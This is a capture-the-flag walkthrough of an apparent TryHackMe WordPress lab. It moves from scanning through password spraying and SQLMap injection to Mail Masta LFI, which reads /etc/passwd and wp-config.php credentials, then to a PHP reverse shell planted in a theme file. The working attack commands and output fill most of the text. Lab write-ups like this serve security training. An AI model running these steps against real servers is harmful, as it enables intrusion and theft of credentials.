# All in One
## Information Gathering
* N/A
```
mkdir ~/Desktop/AllinOne
cd ~/Desktop/AllinOne
```
## Enumeration and Scanning
#### Nmap scanning
```
nmap -sT -sV -O -p- --script "vuln" -T5 -oN TARGET_IP_scan.nmap TARGET_IP
```
```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
|_sslv2-drown: 
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|   /wordpress/: Blog
|_  /wordpress/wp-login.php: Wordpress login page.
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
```
* TCP/21,22, and 80 open.
* Refine nmap scan to enumerate ports.
```
nmap -p21,22,80 --script "safe" -T5 -oN TARGET_IP_scan1.nmap TARGET_IP
```
```
PORT   STATE SERVICE
21/tcp open  ftp
|_banner: 220 (vsFTPd 3.0.3)
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.1.205
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh
|_banner: SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.3
| ssh-hostkey: 
|   2048 e2:5c:33:22:76:5c:93:66:cd:96:9c:16:6a:b3:17:a4 (RSA)
|   256 1b:6a:36:e1:8e:b4:96:5e:c6:ef:0d:91:37:58:59:b6 (ECDSA)
|_  256 fb:fa:db:ea:4e:ed:20:2b:91:18:9d:58:a0:6a:50:ec (EdDSA)
| ssh2-enum-algos: 
|   kex_algorithms: (10)
|   server_host_key_algorithms: (5)
|   encryption_algorithms: (6)
|   mac_algorithms: (10)
|_  compression_algorithms: (2)
80/tcp open  http
| http-comments-displayer: 
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=ip-10-10-74-123.eu-west-1.compute.internal
|     
|     Path: http://ip-10-10-74-123.eu-west-1.compute.internal/#about
|     Line number: 4
|     Comment: 
|         <!--
|             Modified from the Debian original for Ubuntu
|             Last updated: 2016-11-16
|             See: https://launchpad.net/bugs/1288690
|           -->
|     
|     Path: http://ip-10-10-74-123.eu-west-1.compute.internal/#about
|     Line number: 201
|     Comment: 
|         <!--      <div class="table_of_contents floating_element">
|                 <div class="section_header section_header_grey">
|                   TABLE OF CONTENTS
|                 </div>
|                 <div class="table_of_contents_item floating_element">
|                   <a href="#about">About</a>
|                 </div>
|                 <div class="table_of_contents_item floating_element">
|                   <a href="#changes">Changes</a>
|                 </div>
|                 <div class="table_of_contents_item floating_element">
|                   <a href="#scope">Scope</a>
|                 </div>
|                 <div class="table_of_contents_item floating_element">
|                   <a href="#files">Config files</a>
|                 </div>
|               </div>
|_        -->
|_http-date: Mon, 26 Feb 2024 18:10:39 GMT; 0s from local time.
|_http-fetch: Please enter the complete path of the directory to save data in.
| http-headers: 
|   Date: Mon, 26 Feb 2024 18:10:38 GMT
|   Server: Apache/2.4.29 (Ubuntu)
|   Last-Modified: Mon, 05 Oct 2020 19:44:00 GMT
|   ETag: "2aa6-5b0f1b4359fd1"
|   Accept-Ranges: bytes
|   Content-Length: 10918
|   Vary: Accept-Encoding
|   Connection: close
|   Content-Type: text/html
|   
|_  (Request type: HEAD)
|_http-mobileversion-checker: No mobile version detected.
|_http-referer-checker: Couldn't find any cross-domain scripts.
|_http-security-headers: 
|_http-title: Apache2 Ubuntu Default Page: It works
| http-useragent-tester: 
|   Status for browser useragent: 200
|   Allowed User Agents: 
|     Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)
|     libwww
|     lwp-trivial
|     libcurl-agent/1.0
|     PHP/
|     Python-urllib/2.5
|     GT::WWW
|     Snoopy
|     MFC_Tear_Sample
|     HTTP::Lite
|     PHPCrawl
|     URI::Fetch
|     Zend_Http_Client
|     http client
|     PECL::HTTP
|     Wget/1.13.4 (linux-gnu)
|_    WWW-Mechanize/1.34
|_http-xssed: No previously reported XSS vuln.
```
#### Nessus scanning
* 4 x medium severity.
  * SSH Terrapin Prefix Truncation Weakness (CVE-2023-48795) has exploit.
* 2 x Low severity.
  * No public exploits.

## Application Testing
### TCP/21
* vsftpd 3.0.3 application.
  * Connected anonymously - no files or folders exposed.
```
ftp 10.10.74.123
Connected to 10.10.74.123.
220 (vsFTPd 3.0.3)
Name (10.10.74.123:root): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        115          4096 Oct 06  2020 .
drwxr-xr-x    2 0        115          4096 Oct 06  2020 ..
226 Directory send OK.
ftp>bye
```
### TCP/22
* OpenSSH 7.6p1 application.
  * Could not connect anonymously.
```
ssh anonymous@TARGET_IP
The authenticity of host 'TARGET_IP (TARGET_IP)' can't be established.
ECDSA key fingerprint is SHA256:IVzQLYHc196APvwnH40vFHjOR4ZsfNqxHnOG3HuzXgg.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added 'TARGET_IP' (ECDSA) to the list of known hosts.
anonymous@TARGET_IP's password: 
Permission denied, please try again.
```
### TCP/80
* Apache 2.4.29 webserver.
* Use GoBuster to search for hidden directories.
```
gobuster dir --url http://TARGET_IP/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt 
```
```
/wordpress (Status: 301)
/hackathons (Status: 200)
/server-status (Status: 403)
```
#### /wordpress directory
* "All in One" page published with "elyana" as author.
* Enumerate Wordpress users using Metasploit.
```
msf > use auxiliary/scanner/http/wordpress_login_enum
msf auxiliary(wordpress_login_enum) > set rhosts TARGET_IP
msf auxiliary(wordpress_login_enum) > set targeturi /wordpress
msf auxiliary(wordpress_login_enum) > set user_file /usr/share/wordlists/rockyou.txt
msf auxiliary(wordpress_login_enum) > set pass_file /usr/share/wordlists/rockyou.txt
msf auxiliary(wordpress_login_enum) > exploit
```
```
[+] /wordpress - Found user 'elyana' with id 1
[...snip...]
[*] /wordpress/ - WordPress User-Validation - Checking Username:'elyana'
[+] /wordpress/ - WordPress User-Validation - Username: 'elyana' - is VALID
```
#### wordpress/wp-login.php
* Internet search reveals default Wordpress credentials are admin / password.

#### "wpscan" scan to enumerate WordPress.
```
wpscan --update
wpscan --url http://TARGET_IP/Wordpress > wpscan.txt
```
* WordPress v5.5.1.
* twentytwenty theme v1.5.
* Mail Masta plugin v1.0.
* Reflex Gallery 3.1.7.

#### /hackathons directory
* Displays "Damn how much I hate the smell of *Vinegar :/* !!!" 
* Viewing page source displays comments at bottom of page.
```
<!-- Dvc W@iyur@123 -->
<!-- KeepGoing -->
```

## Vulnerablity Research
### vsftpd 3.0.3
* No public exploits listed on Exploit db.
### OpenSSH 7.6p1.
* Vulnerable to CVE-2018-15473 - username enumeration (https://www.exploit-db.com/exploits/4521080)
* SSH Terrapin Prefix Truncation Weakness (CVE-2023-48795) not listed on Exploit db.
### Apache 2.4.29
* No public exploits on Exploit db.
### WordPress
* WordPress v5.5.1.
  * v6.5 Beta 2 is current.
  * No public exploits listed on Exploit db.
* twentytwenty theme v1.5 out of date.
  * v2.5 is current.
  * No public exploits listed on Exploit db.
* Mail Masta plugin v1.0.
  * Vulnerable to [Multiple SQL injection vulnerabilities](https://www.exploit-db.com/exploits/41438).
    * CVE-2017-6095, CVE-2017-6096, CVE-2017-6097, CVE-2017-6098.
  * Vulnerable to [Local File Inclusion (LFI)](https://www.exploit-db.com/exploits/40290) public exploit listed on Exploit db.
> The File Inclusion vulnerability allows an attacker to include a file, usually exploiting a "dynamic file inclusion" mechanisms implemented in the target application. The vulnerability occurs due to the use of user-supplied input without proper validation.
* Reflex Gallery 3.1.7.
  * No public exploits listed on Exploit db.
* [wp-config.php](https://developer.wordpress.org/apis/wp-config-php/)
> One of the most important files in your WordPress installation is the wp-config.php file. This file is located in the root of your WordPress file directory and contains your website’s base configuration details, such as database connection information.
* [How to configure an Apache web server](https://opensource.com/article/18/2/apache-web-server-configuration).
> The DocumentRoot directive specifies the location of the HTML files that make up the pages of the website. That line does not need to be changed because it already points to the standard location. The line should look like this: DocumentRoot "/var/www/html"
 Use "wpscan" to identify WordPress vulnerabilites.

## Exploitation
### Initial Access
#### Password spray SSH using Hydra
```
hydra -l elyana -P /usr/share/wordlists/passwords/rockyou.txt TARGET_IP -t 4 ssh -vV
```
  * THM target host timed out before completion.
* Enumerate openSSH users using https://www.exploit-db.com/exploits/4521080?
#### Use default credentials to logon to /wp-login.php
* Admin / password resulted in "Unknown username. Check again or try your email address." message. 
 * Attempting to logon using username "elyana" results in "Error: The password you entered for the username elyana is incorrect." message.
#### Password spray /wp-login.php using Hydra
```
hydra -l elyana -P /usr/share/wordlists/rockyou.txt TARGET_IP http-post-form "/wordpress/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2FTARGET_IP%2Fwordpress%2Fwp-admin%2F&testcookie=1:Error" -T 64 -vV
```
  * Aborted as too slow - max 4 parallel threads.
#### Password spray WordPress using WPscan
```
sudo wpscan --password-attack xmlrpc -t 20 -U elyana -P /usr/share/wordlists/rockyou.txt --url http://TARGET_IP/wordpress/
```
  * THM target host timed out before completion.

#### Exploit Mail Masta SQLi.
> Mail-Masta SQL Injection. Page: ./wp-content/plugins/mail-masta/inc/lists/csvexport.php (Unauthenticated). GET Parameter: list_id. http://my_wp_app/wp-content/plugins/mail-masta/inc/lists/csvexport.php?list_id=0+OR+1%3D1&pl=/var/www/html/wordpress/wp-load.php.
**Enumerate databases using SQLMap**
```
sqlmap -u "http://TARGET_IP/wordpress/wp-content/plugins/mail-masta/inc/lists/csvexport.php?list_id=0&pl=/var/www/html/wordpress/wp-load.php" --dbs
```
* `-u` specifies target URL.
* `--dbs` tells SQLMap to try to enumerate database.
```
available databases [2]:
[*] information_schema
[*] wordpress
```
**List tables within "wordpress" database using SQLMap**
```
sqlmap -u "http://TARGET_IP/wordpress/wp-content/plugins/mail-masta/inc/lists/csvexport.php?list_id=0&pl=/var/www/html/wordpress/wp-load.php" -D wordpress --tables

Database: wordpress
[23 tables]
+----------------------------+
| wp_commentmeta             |
| wp_comments                |
| wp_links                   |
| wp_masta_campaign          |
| wp_masta_cronapi           |
| wp_masta_list              |
| wp_masta_reports           |
| wp_masta_responder         |
| wp_masta_responder_reports |
| wp_masta_settings          |
| wp_masta_subscribers       |
| wp_masta_support           |
| wp_options                 |
| wp_postmeta                |
| wp_posts                   |
| wp_reflex_gallery          |
| wp_reflex_gallery_images   |
| wp_term_relationships      |
| wp_term_taxonomy           |
| wp_termmeta                |
| wp_terms                   |
| wp_usermeta                |
| wp_users                   |
+----------------------------+
```
**List columns within "wp_users" table using SQLMap**
```
sqlmap -u "http://TARGET_IP/wordpress/wp-content/plugins/mail-masta/inc/lists/csvexport.php?list_id=0&pl=/var/www/html/wordpress/wp-load.php" -D wordpress -D wordpress -T wp_users --columns

Database: wordpress
Table: wp_users
[10 columns]
+---------------------+---------------------+
| Column              | Type                |
+---------------------+---------------------+
| display_name        | varchar(250)        |
| ID                  | bigint(20) unsigned |
| user_activation_key | varchar(255)        |
| user_email          | varchar(100)        |
| user_login          | varchar(60)         |
| user_nicename       | varchar(50)         |
| user_pass           | varchar(255)        |
| user_registered     | datetime            |
| user_status         | int(11)             |
| user_url            | varchar(100)        |
+---------------------+---------------------+
```
**Dump contents of "wp_users" table using SQLMap**
```
Database: wordpress
Table: wp_users
[1 entry]
+----+--------------------------------+------------------------------------+------------+---------------+-------------+--------------+---------------+---------------------+---------------------+
| ID | user_url                       | user_pass                          | user_login | user_email    | user_status | display_name | user_nicename | user_registered     | user_activation_key |
+----+--------------------------------+------------------------------------+------------+---------------+-------------+--------------+---------------+---------------------+---------------------+
| 1  | http://192.168.8.110/wordpress | $P$BhwVLVLk5fGRPyoEfmBfVs82bY7fSq1 | elyana     | none@none.com | 0           | elyana       | elyana        | 2020-10-05 19:55:50 | <blank>             |
+----+--------------------------------+------------------------------------+------------+---------------+-------------+--------------+---------------+---------------------+---------------------+
```
* Elyana is only user on target host.
**Attempt to crack "user_pass" hash**
* [CyberChef](https://gchq.github.io/CyberChef/#recipe=Analyse_hash()&input=JFAkQmh3VkxWTGs1ZkdSUHlvRWZtQmZWczgyYlk3ZlNxMQ) reports that hash is invalid when analysed.
* [hashes.com](https://hashes.com/en/decrypt/hash) could not find a match.
* [crackstation.net](https://crackstation.net/) returned an "unrecognized hash format".
* hashcat?

#### Exploit Mail Masta LFI vulnerability.
> "pl" parameter allows inclusion of a file without any type of input validation or sanitisation. Can attempt to include arbitrary files on the webserver. E.g. display contents of /etc/passwd file using cURL.
```
curl http://TARGET_IP/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
elyana:x:1000:1000:Elyana:/home/elyana:/bin/bash
mysql:x:110:113:MySQL Server,,,:/nonexistent:/bin/false
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
ftp:x:111:115:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
```
  * Elyana user is only other user other than root with "/bin/bash" shell access.
**Read "wp-config.php" using LFI**
```
curl http://TARGET_IP/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/www/html/wordpress/wp-config.php -v
```
* This failed to return any data despite 200 (success) response code.
> **[PHP Filter](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion)**. Used to access the local file system; this is a case insensitive wrapper that provides the capability to apply filters to a stream at the time of opening a file. This wrapper can be used to get content of a file preventing the server from executing it. For example, allowing an attacker to read the content of PHP files to get source code to identify sensitive information such as credentials or other exploitable vulnerabilities. The wrapper can be used like `php://filter/convert.base64-encode/resource=FILE` where `FILE` is the file to retrieve. As a result of the usage of this execution, the content of the target file would be read, encoded to base64 (this is the step that prevents the execution server-side), and returned to the User-Agent.
```
curl http://10.10.74.154/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=php://filter/convert.base64-encode/resource=/var/www/html/wordpress/wp-config.php -v

PD9waHANCi8qKg0KICogVGhlIGJhc2UgY29uZmlndXJhdGlvbiBmb3IgV29yZFByZXNzDQogKg0KICogVGhlIHdwLWNvbmZpZy5waHAgY3JlYXRpb24gc2NyaXB0IHVzZXMgdGhpcyBmaWxlIGR1cmluZyB0aGUNCiAqIGluc3RhbGxhdGlvbi4gWW91IGRvbid0IGhhdmUgdG8gdXNlIHRoZSB3ZWIgc2l0ZSwgeW91IGNhbg0KICogY29weSB0aGlzIGZpbGUgdG8gIndwLWNvbmZpZy5waHAiIGFuZCBmaWxsIGluIHRoZSB2YWx1ZXMuDQogKg0KICogVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBmb2xsb3dpbmcgY29uZmlndXJhdGlvbnM6DQogKg0KICogKiBNeVNRTCBzZXR0aW5ncw0KICogKiBTZWNyZXQga2V5cw0KICogKiBEYXRhYmFzZSB0YWJsZSBwcmVmaXgNCiAqICogQUJTUEFUSA0KICoNCiAqIEBsaW5rIGh0dHBzOi8vd29yZHByZXNzLm9yZy9zdXBwb3J0L2FydGljbGUvZWRpdGluZy13cC1jb25maWctcGhwLw0KICoNCiAqIEBwYWNrYWdlIFdvcmRQcmVzcw0KICovDQoNCi8vICoqIE15U1FMIHNldHRpbmdzIC0gWW91IGNhbiBnZXQgdGhpcyBpbmZvIGZyb20geW91ciB3ZWIgaG9zdCAqKiAvLw0KLyoqIFRoZSBuYW1lIG9mIHRoZSBkYXRhYmFzZSBmb3IgV29yZFByZXNzICovDQpkZWZpbmUoICdEQl9OQU1FJywgJ3dvcmRwcmVzcycgKTsNCg0KLyoqIE15U1FMIGRhdGFiYXNlIHVzZXJuYW1lICovDQpkZWZpbmUoICdEQl9VU0VSJywgJ2VseWFuYScgKTsNCg0KLyoqIE15U1FMIGRhdGFiYXNlIHBhc3N3b3JkICovDQpkZWZpbmUoICdEQl9QQVNTV09SRCcsICdIQGNrbWVAMTIzJyApOw0KDQovKiogTXlTUUwgaG9zdG5hbWUgKi8NCmRlZmluZSggJ0RCX0hPU1QnLCAnbG9jYWxob3N0JyApOw0KDQovKiogRGF0YWJhc2UgQ2hhcnNldCB0byB1c2UgaW4gY3JlYXRpbmcgZGF0YWJhc2UgdGFibGVzLiAqLw0KZGVmaW5lKCAnREJfQ0hBUlNFVCcsICd1dGY4bWI0JyApOw0KDQovKiogVGhlIERhdGFiYXNlIENvbGxhdGUgdHlwZS4gRG9uJ3QgY2hhbmdlIHRoaXMgaWYgaW4gZG91YnQuICovDQpkZWZpbmUoICdEQl9DT0xMQVRFJywgJycgKTsNCg0Kd29yZHByZXNzOw0KZGVmaW5lKCAnV1BfU0lURVVSTCcsICdodHRwOi8vJyAuJF9TRVJWRVJbJ0hUVFBfSE9TVCddLicvd29yZHByZXNzJyk7DQpkZWZpbmUoICdXUF9IT01FJywgJ2h0dHA6Ly8nIC4kX1NFUlZFUlsnSFRUUF9IT1NUJ10uJy93b3JkcHJlc3MnKTsNCg0KLyoqI0ArDQogKiBBdXRoZW50aWNhdGlvbiBVbmlxdWUgS2V5cyBhbmQgU2FsdHMuDQogKg0KICogQ2hhbmdlIHRoZXNlIHRvIGRpZmZlcmVudCB1bmlxdWUgcGhyYXNlcyENCiAqIFlvdSBjYW4gZ2VuZXJhdGUgdGhlc2UgdXNpbmcgdGhlIHtAbGluayBodHRwczovL2FwaS53b3JkcHJlc3Mub3JnL3NlY3JldC1rZXkvMS4xL3NhbHQvIFdvcmRQcmVzcy5vcmcgc2VjcmV0LWtleSBzZXJ2aWNlfQ0KICogWW91IGNhbiBjaGFuZ2UgdGhlc2UgYXQgYW55IHBvaW50IGluIHRpbWUgdG8gaW52YWxpZGF0ZSBhbGwgZXhpc3RpbmcgY29va2llcy4gVGhpcyB3aWxsIGZvcmNlIGFsbCB1c2VycyB0byBoYXZlIHRvIGxvZyBpbiBhZ2Fpbi4NCiAqDQogKiBAc2luY2UgMi42LjANCiAqLw0KZGVmaW5lKCAnQVVUSF9LRVknLCAgICAgICAgICd6a1klbSVSRlliOnUsL2xxLWlafjhmakVOZElhU2I9Xms8M1pyLzBEaUxacVB4enxBdXFsaTZsWi05RFJhZ0pQJyApOw0KZGVmaW5lKCAnU0VDVVJFX0FVVEhfS0VZJywgICdpQVlhazxfJn52OW8re2JAUlBSNjJSOSBUeS0gNlUteUg1YmFVRHs7bmRTaUNbXXFvc3hTQHNjdSZTKWQkSFtUJyApOw0KZGVmaW5lKCAnTE9HR0VEX0lOX0tFWScsICAgICdhUGRfKnNCZj1adWMrK2FdNVZnOT1QfnUwM1EsenZwW2VVZS99KUQ9Ok55aFVZe0tYUl10N300MlVwa1tyNz9zJyApOw0KZGVmaW5lKCAnTk9OQ0VfS0VZJywgICAgICAgICdAaTtUKHt4Vi9mdkUhcyteZGU3ZTRMWDN9TlRAIGo7YjRbejNfZkZKYmJXKG5vIDNPN0ZAc3gwIW95KE9gaCNNJyApOw0KZGVmaW5lKCAnQVVUSF9TQUxUJywgICAgICAgICdCIEFUQGk+KiBOI1c8biEqfGtGZE1uUU4pPl49XihpSHA4VXZnPH4ySH56Rl1pZHlRPXtAfTF9KnJ7bFowLFdZJyApOw0KZGVmaW5lKCAnU0VDVVJFX0FVVEhfU0FMVCcsICdoeDhJOitUejhuMzM1V2htels+JFVaOzhyUVlLPlJ6XVZHeUJkbW83PSZHWiFMTyxwQU1zXWYhelZ9eG46NEFQJyApOw0KZGVmaW5lKCAnTE9HR0VEX0lOX1NBTFQnLCAgICd4N3I+fGMwTUxecztTdzIqVSF4LntgNUQ6UDF9Vz0gL2Npe1E8dEVNPXRyU3YxZWVkfF9mc0xgeV5TLFhJPFJZJyApOw0KZGVmaW5lKCAnTk9OQ0VfU0FMVCcsICAgICAgICd2T2IlV3R5fSR6eDlgfD40NUlwQHN5WiBdRzpDM3xTZEQtUDM8e1lQOi5qUERYKUh9d0dtMSpKXk1TYnMkMWB8JyApOw0KDQovKiojQC0qLw0KDQovKioNCiAqIFdvcmRQcmVzcyBEYXRhYmFzZSBUYWJsZSBwcmVmaXguDQogKg0KICogWW91IGNhbiBoYXZlIG11bHRpcGxlIGluc3RhbGxhdGlvbnMgaW4gb25lIGRhdGFiYXNlIGlmIHlvdSBnaXZlIGVhY2gNCiAqIGEgdW5pcXVlIHByZWZpeC4gT25seSBudW1iZXJzLCBsZXR0ZXJzLCBhbmQgdW5kZXJzY29yZXMgcGxlYXNlIQ0KICovDQokdGFibGVfcHJlZml4ID0gJ3dwXyc7DQoNCi8qKg0KICogRm9yIGRldmVsb3BlcnM6IFdvcmRQcmVzcyBkZWJ1Z2dpbmcgbW9kZS4NCiAqDQogKiBDaGFuZ2UgdGhpcyB0byB0cnVlIHRvIGVuYWJsZSB0aGUgZGlzcGxheSBvZiBub3RpY2VzIGR1cmluZyBkZXZlbG9wbWVudC4NCiAqIEl0IGlzIHN0cm9uZ2x5IHJlY29tbWVuZGVkIHRoYXQgcGx1Z2luIGFuZCB0aGVtZSBkZXZlbG9wZXJzIHVzZSBXUF9ERUJVRw0KICogaW4gdGhlaXIgZGV2ZWxvcG1lbnQgZW52aXJvbm1lbnRzLg0KICoNCiAqIEZvciBpbmZvcm1hdGlvbiBvbiBvdGhlciBjb25zdGFudHMgdGhhdCBjYW4gYmUgdXNlZCBmb3IgZGVidWdnaW5nLA0KICogdmlzaXQgdGhlIGRvY3VtZW50YXRpb24uDQogKg0KICogQGxpbmsgaHR0cHM6Ly93b3JkcHJlc3Mub3JnL3N1cHBvcnQvYXJ0aWNsZS9kZWJ1Z2dpbmctaW4td29yZHByZXNzLw0KICovDQpkZWZpbmUoICdXUF9ERUJVRycsIGZhbHNlICk7DQoN* Connection #0 to host 10.10.74.154 left intact
Ci8qIFRoYXQncyBhbGwsIHN0b3AgZWRpdGluZyEgSGFwcHkgcHVibGlzaGluZy4gKi8NCg0KLyoqIEFic29sdXRlIHBhdGggdG8gdGhlIFdvcmRQcmVzcyBkaXJlY3RvcnkuICovDQppZiAoICEgZGVmaW5lZCggJ0FCU1BBVEgnICkgKSB7DQoJZGVmaW5lKCAnQUJTUEFUSCcsIF9fRElSX18gLiAnLycgKTsNCn0NCg0KLyoqIFNldHMgdXAgV29yZFByZXNzIHZhcnMgYW5kIGluY2x1ZGVkIGZpbGVzLiAqLw0KcmVxdWlyZV9vbmNlIEFCU1BBVEggLiAnd3A
```
**Decode Base64 in BurpSuite Decoder tool**
```
<?php
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-config.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://wordpress.org/support/article/editing-wp-config-php/
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** MySQL database username */
define( 'DB_USER', 'elyana' );

/** MySQL database password */
define( 'DB_PASSWORD', 'H@ckme@123' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );

/** Database Charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8mb4' );

/** The Database Collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

wordpress;
define( 'WP_SITEURL', 'http://' .$_SERVER['HTTP_HOST'].'/wordpress');
define( 'WP_HOME', 'http://' .$_SERVER['HTTP_HOST'].'/wordpress');

/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define( 'AUTH_KEY',         'zkY%m%RFYb:u,/lq-iZ~8fjENdIaSb=^k<3Zr/0DiLZqPxz|Auqli6lZ-9DRagJP' );
define( 'SECURE_AUTH_KEY',  'iAYak<_&~v9o+{b@RPR62R9 Ty- 6U-yH5baUD{;ndSiC[]qosxS@scu&S)d$H[T' );
define( 'LOGGED_IN_KEY',    'aPd_*sBf=Zuc++a]5Vg9=P~u03Q,zvp[eUe/})D=:NyhUY{KXR]t7}42Upk[r7?s' );
define( 'NONCE_KEY',        '@i;T({xV/fvE!s+^de7e4LX3}NT@ j;b4[z3_fFJbbW(no 3O7F@sx0!oy(O`h#M' );
define( 'AUTH_SALT',        'B AT@i>* N#W<n!*|kFdMnQN)>^=^(iHp8Uvg<~2H~zF]idyQ={@}1}*r{lZ0,WY' );
define( 'SECURE_AUTH_SALT', 'hx8I:+Tz8n335Whmz[>$UZ;8rQYK>Rz]VGyBdmo7=&GZ!LO,pAMs]f!zV}xn:4AP' );
define( 'LOGGED_IN_SALT',   'x7r>|c0ML^s;Sw2*U!x.{`5D:P1}W= /ci{Q<tEM=trSv1eed|_fsL`y^S,XI<RY' );
define( 'NONCE_SALT',       'vOb%Wty}$zx9`|>45Ip@syZ ]G:C3|SdD-P3<{YP:.jPDX)H}wGm1*J^MSbs$1`|' );

/**#@-*/

/**
 * WordPress Database Table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
$table_prefix = 'wp_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the documentation.
 *
 * @link https://wordpress.org/support/article/debugging-in-wordpress/
 */
define( 'WP_DEBUG', false );

* 
çyËbon #0 to - 10.10.74.154 çí {Zct

/* That's all, stop editing! Happy publishing. */

/** Absolute path to the WordPress directory. */
if ( ! defined( 'ABSPATH' ) ) {
	define( 'ABSPATH', __DIR__ . '/' );
}

/** Sets up WordPress vars and included files. */
require_once ABSPATH . 'd3A
```
#### Logged into /wp-admin using MySQL db credentials
  * elyana / H@ckme@123
* Credentials are invalid for SSH.
```
ssh elyana@10.10.199.13
The authenticity of host '10.10.199.13 (10.10.199.13)' can't be established.
ECDSA key fingerprint is SHA256:IVzQLYHc196APvwnH40vFHjOR4ZsfNqxHnOG3HuzXgg.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '10.10.199.13' (ECDSA) to the list of known hosts.
elyana@10.10.199.13's password: 
Permission denied, please try again.
```
#### Upload reverse shell to WordPress
* WordPress Appearance > Theme Editor.
* Open "Theme Header" (header.php) from "Theme Files" list.
* Copy "php-reverse-shell.php" to working folder.
```
cp /usr/share/webshells/php/php-reverse-shell.php ~/Desktop/AllinOne
```
* Open copy of "php-reverse-shell.php".
* Edit "ip" field.
* Save and close file.
* Copy and paste code from reverse shell to top of "header.php" file in WordPress.
#### Start netcat listener on attack host
```
nc -lvnp 1234
```
* "Update File" in WordPress to save changes and launch remote shell.
#### Shell caught by listener
```
Connection from 10.10.199.13 44038 received!
Linux elyana 4.15.0-118-generic #119-Ubuntu SMP Tue Sep 8 12:30:01 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 16:04:53 up 27 min,  0 users,  load average: 0.00, 0.00, 0.07
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
```
#### Stabilise netcat shell
```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```
